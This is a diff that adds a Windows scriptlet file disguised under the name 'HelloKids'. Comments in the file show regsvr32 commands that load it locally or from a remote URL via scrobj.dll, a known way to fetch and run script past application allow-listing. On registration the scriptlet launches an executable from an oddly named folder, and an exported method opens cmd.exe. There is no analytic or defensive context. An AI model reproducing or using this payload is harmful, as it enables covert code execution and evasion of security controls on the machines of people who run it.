@@ -1,0 +1,30 @@
+<?XML version="1.0"?>	
+<scriptlet>	
+
+<registration	
+    description="HelloKids"	
+    progid="Hello Kids"	
+    version="2.31"	
+    classid="{20401231-0046-00830-0000-0000FEQDAFGC}"	
+	>	
+	<!-- regsvr32 /s /i"C:\Hello\HelloKids.sct" scrobj.dll -->	
+	<!-- regsvr32 /s /i:http://server/HelloKids.sct scrobj.dll -->	
+	<script language="JScript">	
+		<![CDATA[	
+			var runner = new ActiveXObject("WScript.Shell").Run("C:\\Program Files\\Cosmopolitanize\\Diggins.exe");		
+		]]>	
+</script>	
+</registration>	
+
+<public>	
+    <method name="Exec"></method>	
+</public>	
+<script language="JScript">	
+<![CDATA[	
+	function Exec()	
+	{	
+		var runner = new ActiveXObject("WScript.Shell").Run("cmd.exe");	
+	}	
+]]>	
+</script>	
+</scriptlet>
